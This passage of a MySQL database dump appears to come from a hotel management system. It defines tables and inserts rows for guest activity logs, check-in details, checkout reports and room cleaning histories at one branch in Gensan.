Food and Beverages','Added new food and beverages of ₱60 for guest test','2025-11-20 15:29:18','2025-11-20 15:29:18'),(232,1,3,'Payment','Payment of ₱60 for guest test','2025-11-20 15:29:26','2025-11-20 15:29:26'),(233,1,3,'Payment','Payment of ₱200 for guest t5','2025-11-20 15:37:44','2025-11-20 15:37:44'),(234,1,3,'Payment','Payment of ₱500 for guest t5','2025-11-20 15:37:59','2025-11-20 15:37:59'),(235,1,3,'Check Out','Checked out guest t5 from Room #23','2025-11-20 15:46:45','2025-11-20 15:46:45'),(236,1,3,'Room Transfer','Guest nenyu transferred from Room #257 to Room #64','2025-11-20 15:49:25','2025-11-20 15:49:25'),(237,1,3,'Check Out','Checked out guest nenyu from Room #64','2025-11-20 15:50:24','2025-11-20 15:50:24'),(238,1,3,'Room Transfer','Guest thian transferred from Room #101 to Room #5','2025-11-20 16:07:39','2025-11-20 16:07:39'),(239,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest thian','2025-11-20 16:07:45','2025-11-20 16:07:45'),(240,1,3,'Check Out','Checked out guest thian from Room #5','2025-11-20 16:08:05','2025-11-20 16:08:05'),(241,1,3,'Check In from Kiosk','Checked in guest unique from kiosk','2025-11-20 16:09:44','2025-11-20 16:09:44'),(242,1,3,'Room Transfer','Guest unique transferred from Room #63 to Room #123','2025-11-20 16:10:32','2025-11-20 16:10:32'),(243,1,3,'Check Out','Checked out guest unique from Room #123','2025-11-20 16:10:54','2025-11-20 16:10:54'),(244,1,2,'Create User','Created user Tan','2025-11-21 20:21:40','2025-11-21 20:21:40'),(245,1,2,'Update Room','Updated room 108','2025-11-21 20:24:40','2025-11-21 20:24:40'),(246,1,2,'Update Room','Updated room 117','2025-11-21 20:24:56','2025-11-21 20:24:56'),(247,1,2,'Update Room','Updated room 119','2025-11-21 20:25:08','2025-11-21 20:25:08'),(248,1,2,'Update Room','Updated room 200','2025-11-21 20:25:16','2025-11-21 20:25:16'),(249,1,2,'Update Room','Updated room 201','2025-11-21 20:25:24','2025-11-21 20:25:24'),(250,1,10,'Check In from Kiosk','Checked in guest Kian Lee from kiosk','2025-11-21 20:33:42','2025-11-21 20:33:42'),(251,1,10,'Add Extension','Added new extension of ₱1172 for guest Kian Lee','2025-11-21 20:34:30','2025-11-21 20:34:30'),(252,1,10,'Add Damage Charges','Added new damage charges of ₱500 for guest Kian Lee','2025-11-21 20:44:38','2025-11-21 20:44:38'),(253,1,10,'Pay All Unpaid Balances','All unpaid balances are paid for guest Kian Lee','2025-11-21 20:44:41','2025-11-21 20:44:41'),(254,1,10,'Check In from Kiosk','Checked in guest Shein Tan from kiosk','2025-11-21 20:49:09','2025-11-21 20:49:09'),(255,1,10,'Add Food and Beverages','Added new food and beverages of ₱15 for guest Shein Tan','2025-11-21 20:49:26','2025-11-21 20:49:26'),(256,1,10,'Pay All Unpaid Balances','All unpaid balances are paid for guest Shein Tan','2025-11-21 20:49:30','2025-11-21 20:49:30'),(257,1,10,'Add Extension','Added new extension of ₱1060 for guest Shein Tan','2025-11-21 20:50:00','2025-11-21 20:50:00'),(258,1,10,'Pay All Unpaid Balances','All unpaid balances are paid for guest Shein Tan','2025-11-21 20:50:03','2025-11-21 20:50:03'),(259,1,10,'Deduct Deposit','Deducted deposit of ₱500 for guest Shein Tan','2025-11-21 20:51:10','2025-11-21 20:51:10'),(260,1,10,'Add Deposit','Added new deposit of ₱500 for guest Shein Tan','2025-11-21 20:51:16','2025-11-21 20:51:16'),(261,1,10,'Check Out','Checked out guest Shein Tan from Room #117','2025-11-21 20:53:46','2025-11-21 20:53:46'),(262,1,10,'Check In from Kiosk','Checked in guest Carie Perry from kiosk','2025-11-21 20:53:54','2025-11-21 20:53:54'),(263,1,10,'Add Extension','Added new extension of ₱200 for guest Carie Perry','2025-11-21 20:54:10','2025-11-21 20:54:10'),(264,1,10,'Add Deposit','Added new deposit of ₱1000 for guest Carie Perry','2025-11-21 20:54:23','2025-11-21 20:54:23'),(265,1,10,'Check In from Kiosk','Checked in guest Inna Liu from kiosk','2025-11-21 20:57:02','2025-11-21 20:57:02'),(266,1,10,'Add Extension','Added new extension of ₱200 for guest Inna Liu','2025-11-21 20:57:15','2025-11-21 20:57:15'),(267,1,10,'Add Deposit','Added new deposit of ₱2000 for guest Inna Liu','2025-11-21 20:57:35','2025-11-21 20:57:35'),(268,1,10,'Check In from Kiosk','Checked in guest Ella Cy from kiosk','2025-11-21 20:59:50','2025-11-21 20:59:50'),(269,1,10,'Add Extension','Added new extension of ₱1116 for guest Ella Cy','2025-11-21 21:00:09','2025-11-21 21:00:09'),(270,1,10,'Add Deposit','Added new deposit of ₱5000 for guest Ella Cy','2025-11-21 21:00:21','2025-11-21 21:00:21'),(271,1,10,'Add Food and Beverages','Added new food and beverages of ₱50 for guest Ella Cy','2025-11-21 21:00:44','2025-11-21 21:00:44'),(272,1,10,'Payment with Deposit','Payment of ₱1166 with deposit for guest Ella Cy','2025-11-21 21:01:07','2025-11-21 21:01:07'),(273,1,10,'Check Out','Checked out guest Ella Cy from Room #201','2025-11-21 21:01:47','2025-11-21 21:01:47'),(274,1,10,'Check In from Kiosk','Checked in guest Ariel Lee from kiosk','2025-11-21 21:04:31','2025-11-21 21:04:31'),(275,1,2,'Create Extension Rate','Created extension rate for 3 hour(s)','2025-11-21 21:05:47','2025-11-21 21:05:47'),(276,1,10,'Add Extension','Added new extension of ₱666 for guest Ariel Lee','2025-11-21 21:06:06','2025-11-21 21:06:06'),(277,1,10,'Add Food and Beverages','Added new food and beverages of ₱75 for guest Ariel Lee','2025-11-21 21:06:26','2025-11-21 21:06:26'),(278,1,10,'Add Deposit','Added new deposit of ₱1000 for guest Ariel Lee','2025-11-21 21:06:33','2025-11-21 21:06:33'),(279,1,10,'Payment with Deposit','Payment of ₱741 with deposit for guest Ariel Lee','2025-11-21 21:06:36','2025-11-21 21:06:36'),(280,1,10,'Check Out','Checked out guest Ariel Lee from Room #300','2025-11-21 21:10:49','2025-11-21 21:10:49'),(281,1,2,'Create Room','Created room 45','2025-11-21 21:12:20','2025-11-21 21:12:20'),(282,1,2,'Create Room','Created room 46','2025-11-21 21:12:29','2025-11-21 21:12:29'),(283,1,2,'Update Room','Updated room 50','2025-11-21 21:12:52','2025-11-21 21:12:52'),(284,1,2,'Create Room','Created room 55','2025-11-21 21:13:05','2025-11-21 21:13:05'),(285,1,2,'Create Room','Created room 59','2025-11-21 21:13:23','2025-11-21 21:13:23'),(286,1,2,'Update Room','Updated room 60','2025-11-21 21:13:45','2025-11-21 21:13:45'),(287,1,10,'Check In from Kiosk','Checked in guest Ker Tan from kiosk','2025-11-21 21:19:28','2025-11-21 21:19:28'),(288,1,10,'Check Out','Checked out guest Ker Tan from Room #45','2025-11-21 21:19:53','2025-11-21 21:19:53'),(289,1,10,'Check In from Kiosk','Checked in guest Ela Cruz from kiosk','2025-11-21 21:28:29','2025-11-21 21:28:29'),(290,1,10,'Check Out','Checked out guest Ela Cruz from Room #46','2025-11-21 21:28:54','2025-11-21 21:28:54'),(291,1,10,'Check In from Kiosk','Checked in guest Chun Wanta from kiosk','2025-11-21 21:30:17','2025-11-21 21:30:17'),(292,1,10,'Check Out','Checked out guest Chun Wanta from Room #50','2025-11-21 21:31:28','2025-11-21 21:31:28'),(293,1,10,'Check In from Kiosk','Checked in guest Gab Prie from kiosk','2025-11-21 21:33:14','2025-11-21 21:33:14'),(294,1,10,'Add Amenities','Added new amenities of ₱100 for guest Gab Prie','2025-11-21 21:33:32','2025-11-21 21:33:32'),(295,1,10,'Pay All Unpaid Balances','All unpaid balances are paid for guest Gab Prie','2025-11-21 21:33:35','2025-11-21 21:33:35'),(296,1,10,'Check Out','Checked out guest Gab Prie from Room #55','2025-11-21 21:34:57','2025-11-21 21:34:57'),(297,1,10,'Check In from Kiosk','Checked in guest Cielo Shen from kiosk','2025-11-21 21:36:25','2025-11-21 21:36:25'),(298,1,10,'Add Extension','Added new extension of ₱760 for guest Cielo Shen','2025-11-21 21:37:10','2025-11-21 21:37:10'),(299,1,10,'Add Amenities','Added new amenities of ₱100 for guest Cielo Shen','2025-11-21 21:37:25','2025-11-21 21:37:25'),(300,1,10,'Pay All Unpaid Balances','All unpaid balances are paid for guest Cielo Shen','2025-11-21 21:37:28','2025-11-21 21:37:28'),(301,1,10,'Check Out','Checked out guest Cielo Shen from Room #59','2025-11-21 21:38:22','2025-11-21 21:38:22'),(302,1,10,'Check In from Kiosk','Checked in guest Lorie Kiel from kiosk','2025-11-21 21:40:03','2025-11-21 21:40:03'),(303,1,10,'Add Extension','Added new extension of ₱760 for guest Lorie Kiel','2025-11-21 21:40:25','2025-11-21 21:40:25'),(304,1,10,'Add Amenities','Added new amenities of ₱40 for guest Lorie Kiel','2025-11-21 21:40:41','2025-11-21 21:40:41'),(305,1,10,'Add Amenities','Added new amenities of ₱80 for guest Lorie Kiel','2025-11-21 21:40:55','2025-11-21 21:40:55'),(306,1,10,'Add Amenities','Added new amenities of ₱20 for guest Lorie Kiel','2025-11-21 21:41:08','2025-11-21 21:41:08'),(307,1,10,'Add Food and Beverages','Added new food and beverages of ₱10 for guest Lorie Kiel','2025-11-21 21:41:39','2025-11-21 21:41:39'),(308,1,10,'Add Food and Beverages','Added new food and beverages of ₱75 for guest Lorie Kiel','2025-11-21 21:41:49','2025-11-21 21:41:49');
/*!40000 ALTER TABLE `activity_logs` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `assigned_frontdesks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `assigned_frontdesks` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `user_id` bigint unsigned NOT NULL,
  `frontdesk_id` bigint unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `assigned_frontdesks` WRITE;
/*!40000 ALTER TABLE `assigned_frontdesks` DISABLE KEYS */;
/*!40000 ALTER TABLE `assigned_frontdesks` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `branches`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `branches` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `autorization_code` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `old_autorization` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `extension_time_reset` int DEFAULT NULL,
  `initial_deposit` decimal(10,2) NOT NULL DEFAULT '200.00',
  `discount_enabled` tinyint(1) NOT NULL DEFAULT '1',
  `discount_amount` decimal(10,2) NOT NULL DEFAULT '50.00',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `branches` WRITE;
/*!40000 ALTER TABLE `branches` DISABLE KEYS */;
INSERT INTO `branches` VALUES (1,'ALMA RESIDENCES GENSAN','Brgy. 1, Gensan, South Cotabato','12345',NULL,24,200.00,1,50.00,'2025-11-18 14:22:59','2025-11-18 14:22:59');
/*!40000 ALTER TABLE `branches` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `check_out_guest_reports`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `check_out_guest_reports` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `room_id` bigint unsigned NOT NULL,
  `checkin_details_id` bigint unsigned NOT NULL,
  `shift_date` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `shift` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `frontdesk_id` int NOT NULL,
  `partner_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=32 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `check_out_guest_reports` WRITE;
/*!40000 ALTER TABLE `check_out_guest_reports` DISABLE KEYS */;
INSERT INTO `check_out_guest_reports` VALUES (1,3,3,'November 18, 2025','AM',1,'Tan','2025-11-18 15:39:06','2025-11-18 15:39:06'),(2,6,4,'November 18, 2025','AM',1,'Tan','2025-11-18 15:39:29','2025-11-18 15:39:29'),(3,17,1,'November 18, 2025','AM',1,'Tan','2025-11-19 08:48:52','2025-11-19 08:48:52'),(4,23,2,'November 18, 2025','AM',1,'Tan','2025-11-19 08:49:32','2025-11-19 08:49:32'),(5,209,7,'November 18, 2025','AM',1,'Tan','2025-11-19 08:51:13','2025-11-19 08:51:13'),(6,127,8,'November 18, 2025','AM',1,'Tan','2025-11-19 08:52:40','2025-11-19 08:52:40'),(7,3,11,'November 18, 2025','AM',1,'Tan','2025-11-19 09:56:52','2025-11-19 09:56:52'),(8,6,13,'November 18, 2025','AM',1,'Tan','2025-11-19 15:39:05','2025-11-19 15:39:05'),(9,207,5,'November 18, 2025','AM',1,'Tan','2025-11-20 08:52:48','2025-11-20 08:52:48'),(10,210,10,'November 18, 2025','AM',1,'Tan','2025-11-20 09:00:13','2025-11-20 09:00:13'),(11,209,12,'November 18, 2025','AM',1,'Tan','2025-11-20 09:00:19','2025-11-20 09:00:19'),(12,208,6,'November 18, 2025','AM',1,'Tan','2025-11-20 09:02:13','2025-11-20 09:02:13'),(13,128,9,'November 18, 2025','AM',1,'Tan','2025-11-20 09:03:00','2025-11-20 09:03:00'),(14,1,14,'November 18, 2025','AM',1,'Tan','2025-11-20 10:14:04','2025-11-20 10:14:04'),(15,7,15,'November 18, 2025','AM',1,'Tan','2025-11-20 10:43:55','2025-11-20 10:43:55'),(16,205,16,'November 18, 2025','AM',1,'Tan','2025-11-20 10:59:39','2025-11-20 10:59:39'),(17,17,19,'November 18, 2025','AM',1,'Tan','2025-11-20 11:16:03','2025-11-20 11:16:03'),(18,2,20,'November 18, 2025','AM',1,'Tan','2025-11-20 13:11:54','2025-11-20 13:11:54'),(19,209,17,'November 18, 2025','AM',1,'Tan','2025-11-20 13:28:47','2025-11-20 13:28:47'),(20,15,21,'November 18, 2025','AM',1,'Tan','2025-11-20 15:46:45','2025-11-20 15:46:45'),(21,49,22,'November 18, 2025','AM',1,'Tan','2025-11-20 15:50:24','2025-11-20 15:50:24'),(22,34,23,'November 18, 2025','AM',1,'Tan','2025-11-20 16:08:05','2025-11-20 16:08:05'),(23,88,25,'November 18, 2025','AM',1,'Tan','2025-11-20 16:10:54','2025-11-20 16:10:54'),(24,208,27,'November 21, 2025','PM',2,'Bhong','2025-11-21 20:53:46','2025-11-21 20:53:46'),(25,128,30,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:01:47','2025-11-21 21:01:47'),(26,210,31,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:10:49','2025-11-21 21:10:49'),(27,211,32,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:19:53','2025-11-21 21:19:53'),(28,212,33,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:28:54','2025-11-21 21:28:54'),(29,35,34,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:31:28','2025-11-21 21:31:28'),(30,213,35,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:34:57','2025-11-21 21:34:57'),(31,214,36,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:38:22','2025-11-21 21:38:22');
/*!40000 ALTER TABLE `check_out_guest_reports` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `checkin_details`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `checkin_details` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `guest_id` bigint unsigned NOT NULL,
  `frontdesk_id` int DEFAULT NULL,
  `type_id` bigint unsigned NOT NULL,
  `room_id` bigint unsigned NOT NULL,
  `rate_id` bigint unsigned NOT NULL,
  `static_amount` int NOT NULL,
  `hours_stayed` int NOT NULL,
  `total_deposit` int DEFAULT NULL,
  `total_deduction` int NOT NULL DEFAULT '0',
  `check_in_at` datetime NOT NULL,
  `check_out_at` datetime NOT NULL,
  `is_check_out` tinyint(1) NOT NULL DEFAULT '0',
  `is_long_stay` tinyint(1) NOT NULL,
  `number_of_hours` int NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=38 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `checkin_details` WRITE;
/*!40000 ALTER TABLE `checkin_details` DISABLE KEYS */;
INSERT INTO `checkin_details` VALUES (1,1,1,1,17,3,760,24,1200,585,'2025-11-18 15:02:45','2025-11-19 15:02:45',1,0,0,'2025-11-18 15:02:45','2025-11-19 08:48:52'),(2,2,1,1,23,3,760,24,200,0,'2025-11-18 15:02:56','2025-11-19 15:02:56',1,0,0,'2025-11-18 15:02:56','2025-11-19 08:49:32'),(3,3,1,2,3,4,480,6,200,0,'2025-11-18 15:03:12','2025-11-18 21:03:12',1,0,0,'2025-11-18 15:03:12','2025-11-18 15:39:06'),(4,4,1,2,6,4,480,6,200,0,'2025-11-18 15:03:40','2025-11-18 21:03:40',1,0,0,'2025-11-18 15:03:40','2025-11-18 15:39:29'),(5,5,1,3,207,9,872,24,200,0,'2025-11-18 15:05:07','2025-11-20 15:05:07',1,0,24,'2025-11-18 15:05:07','2025-11-20 08:52:48'),(6,6,1,1,208,3,760,24,700,0,'2025-11-18 15:05:29','2025-11-20 15:05:29',1,0,24,'2025-11-18 15:05:29','2025-11-20 09:02:13'),(7,7,1,1,209,2,536,12,1200,215,'2025-11-18 15:05:38','2025-11-19 15:05:38',1,0,24,'2025-11-18 15:05:38','2025-11-19 08:51:13'),(8,8,1,3,127,8,648,12,2200,230,'2025-11-18 15:05:46','2025-11-19 15:05:46',1,0,24,'2025-11-18 15:05:46','2025-11-19 08:52:40'),(9,9,1,2,128,6,816,24,5200,1126,'2025-11-18 15:05:58','2025-11-20 15:05:58',1,0,24,'2025-11-18 15:05:58','2025-11-20 09:03:00'),(10,10,1,2,210,6,816,24,1200,731,'2025-11-18 15:06:24','2025-11-19 21:06:24',1,0,6,'2025-11-18 15:06:24','2025-11-20 09:00:13'),(11,11,1,2,3,5,592,12,208,0,'2025-11-19 09:42:32','2025-11-19 21:42:32',1,0,0,'2025-11-19 09:42:32','2025-11-19 09:56:52'),(12,12,2,1,209,2,536,12,264,0,'2025-11-19 15:07:03','2025-11-20 03:07:03',1,0,0,'2025-11-19 15:07:03','2025-11-20 09:00:19'),(13,13,1,1,6,2,536,12,264,0,'2025-11-19 15:38:37','2025-11-20 03:38:37',1,0,0,'2025-11-19 15:38:37','2025-11-19 15:39:05'),(14,14,1,2,1,2,536,12,1264,1000,'2025-11-20 09:49:06','2025-11-21 09:49:06',1,0,24,'2025-11-20 09:49:06','2025-11-20 10:14:04'),(15,15,1,3,7,2,536,12,1200,225,'2025-11-20 10:17:22','2025-11-22 10:17:22',1,0,24,'2025-11-20 10:17:22','2025-11-20 10:43:55'),(16,16,1,1,205,8,648,12,1565,1365,'2025-11-20 10:17:39','2025-11-22 04:17:39',1,0,18,'2025-11-20 10:17:39','2025-11-20 10:59:39'),(17,17,1,1,209,3,760,24,440,240,'2025-11-20 10:55:17','2025-11-21 10:55:17',1,0,0,'2025-11-20 10:55:17','2025-11-20 13:28:47'),(18,18,1,2,3,5,592,12,1208,270,'2025-11-20 10:55:52','2025-11-21 16:55:52',0,0,6,'2025-11-20 10:55:52','2025-11-20 11:29:36'),(19,19,1,1,17,2,536,12,664,464,'2025-11-20 11:10:24','2025-11-20 23:10:24',1,0,0,'2025-11-20 11:10:24','2025-11-20 11:16:03'),(20,20,1,2,2,5,592,12,700,500,'2025-11-20 11:10:53','2025-11-21 11:10:53',1,0,24,'2025-11-20 11:10:53','2025-11-20 13:11:54'),(21,21,1,3,15,9,872,24,750,500,'2025-11-20 11:11:19','2025-11-22 05:11:19',1,0,18,'2025-11-20 11:11:19','2025-11-20 15:46:45'),(22,22,1,1,49,3,760,24,200,0,'2025-11-20 13:19:32','2025-11-21 13:19:32',1,0,0,'2025-11-20 13:19:32','2025-11-20 15:50:24'),(23,25,1,1,34,3,560,24,0,0,'2025-11-20 14:10:58','2025-11-21 14:10:58',1,0,0,'2025-11-20 14:10:58','2025-11-20 16:08:05'),(24,24,1,3,89,4,480,6,9202,8000,'2025-11-20 14:11:29','2025-11-20 20:11:29',0,0,0,'2025-11-20 14:11:29','2025-11-20 14:55:18'),(25,26,1,1,88,1,424,6,200,0,'2025-11-20 16:09:44','2025-11-20 22:09:44',1,0,0,'2025-11-20 16:09:44','2025-11-20 16:10:54'),(26,27,2,3,207,9,872,24,200,0,'2025-11-21 20:33:42','2025-11-23 20:33:42',0,0,24,'2025-11-21 20:33:42','2025-11-21 20:34:30'),(27,28,2,1,208,3,760,24,1200,500,'2025-11-21 20:49:09','2025-11-23 20:49:09',1,0,24,'2025-11-21 20:49:09','2025-11-21 20:53:46'),(28,29,2,1,209,2,536,12,1200,0,'2025-11-21 20:53:54','2025-11-22 20:53:54',0,0,24,'2025-11-21 20:53:54','2025-11-21 20:54:23'),(29,30,2,3,127,8,648,12,2200,0,'2025-11-21 20:57:02','2025-11-22 20:57:02',0,0,24,'2025-11-21 20:57:02','2025-11-21 20:57:35'),(30,31,2,2,128,6,816,24,5200,1166,'2025-11-21 20:59:50','2025-11-23 20:59:50',1,0,24,'2025-11-21 20:59:50','2025-11-21 21:01:47'),(31,32,2,2,210,6,816,24,1200,741,'2025-11-21 21:04:31','2025-11-23 00:04:31',1,0,3,'2025-11-21 21:04:31','2025-11-21 21:10:49'),(32,33,2,1,211,2,536,12,200,0,'2025-11-21 21:19:28','2025-11-22 09:19:28',1,0,0,'2025-11-21 21:19:28','2025-11-21 21:19:53'),(33,34,2,1,212,2,536,12,200,0,'2025-11-21 21:28:29','2025-11-22 09:28:29',1,0,0,'2025-11-21 21:28:29','2025-11-21 21:28:54'),(34,35,2,3,35,8,648,12,200,0,'2025-11-21 21:30:17','2025-11-22 09:30:17',1,0,0,'2025-11-21 21:30:17','2025-11-21 21:31:28'),(35,36,2,3,213,8,648,12,200,0,'2025-11-21 21:33:14','2025-11-22 09:33:14',1,0,0,'2025-11-21 21:33:14','2025-11-21 21:34:57'),(36,37,2,1,214,3,760,24,200,0,'2025-11-21 21:36:25','2025-11-23 09:36:25',1,0,12,'2025-11-21 21:36:25','2025-11-21 21:38:22'),(37,38,2,1,45,3,760,24,200,0,'2025-11-21 21:40:03','2025-11-23 09:40:03',0,0,12,'2025-11-21 21:40:03','2025-11-21 21:40:25');
/*!40000 ALTER TABLE `checkin_details` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `cleaning_histories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `cleaning_histories` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint unsigned NOT NULL,
  `room_id` bigint unsigned NOT NULL,
  `floor_id` bigint unsigned NOT NULL,
  `branch_id` bigint unsigned NOT NULL,
  `start_time` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `end_time` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `current_assigned_floor_id` tinyint(1) NOT NULL,
  `expected_end_time` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `cleaning_duration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `delayed_cleaning` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=17 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `cleaning_histories` WRITE;
/*!40000 ALTER TABLE `cleaning_histories` DISABLE KEYS */;
INSERT INTO `cleaning_histories` VALUES (1,7,3,1,1,'2025-11-18 15:42:21','2025-11-18 16:04:07',1,'2025-11-18 18:39:06','21',0,'2025-11-18 16:04:07','2025-11-18 16:04:07'),(2,7,6,1,1,'2025-11-18 16:04:11','2025-11-18 16:28:08',1,'2025-11-18 18:39:29','23',0,'2025-11-18 16:28:08','2025-11-18 16:28:08'),(3,7,17,1,1,'2025-11-19 08:53:17','2025-11-19 09:08:29',1,'2025-11-19 11:48:52','15',0,'2025-11-19 09:08:29','2025-11-19 09:08:29'),(4,7,23,1,1,'2025-11-19 09:08:42','2025-11-19 09:24:29',1,'2025-11-19 11:49:32','15',0,'2025-11-19 09:24:29','2025-11-19 09:24:29'),(5,7,209,1,1,'2025-11-19 09:24:37','2025-11-19 09:40:21',1,'2025-11-19 11:51:13','15',0,'2025-11-19 09:40:21','2025-11-19 09:40:21'),(6,7,127,4,1,'2025-11-19 09:40:56','2025-11-19 09:56:14',0,'2025-11-19 11:52:40','15',0,'2025-11-19 09:56:14','2025-11-19 09:56:14'),(7,7,3,1,1,'2025-11-19 09:58:00','2025-11-19 10:13:52',1,'2025-11-19 12:56:52','15',0,'2025-11-19 10:13:52','2025-11-19 10:13:52'),(8,7,6,1,1,'2025-11-19 15:39:31','2025-11-19 15:57:04',1,'2025-11-19 18:39:05','17',0,'2025-11-19 15:57:04','2025-11-19 15:57:04'),(9,7,207,3,1,'2025-11-20 08:58:13','2025-11-20 09:13:44',0,'2025-11-20 11:52:48','15',0,'2025-11-20 09:13:44','2025-11-20 09:13:44'),(10,7,210,3,1,'2025-11-20 09:13:48','2025-11-20 09:30:44',0,'2025-11-20 12:00:13','16',0,'2025-11-20 09:30:44','2025-11-20 09:30:44'),(11,7,209,1,1,'2025-11-20 09:30:51','2025-11-20 10:44:09',1,'2025-11-20 12:00:19','73',0,'2025-11-20 10:44:09','2025-11-20 10:44:09'),(12,7,17,1,1,'2025-11-20 10:44:16','2025-11-20 11:08:54',1,'2025-11-20 12:52:33','24',0,'2025-11-20 11:08:54','2025-11-20 11:08:54'),(13,7,1,1,1,'2025-11-20 11:08:57','2025-11-20 13:09:45',1,'2025-11-20 13:14:04','120',0,'2025-11-20 13:09:45','2025-11-20 13:09:45'),(14,7,205,5,1,'2025-11-20 13:09:50','2025-11-20 13:26:35',0,'2025-11-20 13:59:39','16',0,'2025-11-20 13:26:35','2025-11-20 13:26:35'),(15,7,23,1,1,'2025-11-20 13:27:07','2025-11-20 14:04:21',1,'2025-11-20 13:19:12','37',1,'2025-11-20 14:04:21','2025-11-20 14:04:21'),(16,7,7,1,1,'2025-11-20 14:04:25','2025-11-20 14:21:59',1,'2025-11-20 13:43:55','17',1,'2025-11-20 14:21:59','2025-11-20 14:21:59');
/*!40000 ALTER TABLE `cleaning_histories` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `discounts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `discounts` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `amount` int NOT NULL,
  `is_percentage` tinyint(1) NOT NULL,
  `is_available` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `discounts` WRITE;
/*!40000 ALTER TABLE `discounts` DISABLE KEYS */;
/*!40000 ALTER TABLE `discounts` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `expense_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `expense_categories` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `expense_categories` WRITE;
/*!40000 ALTER TABLE `expense_categories` DISABLE KEYS */;
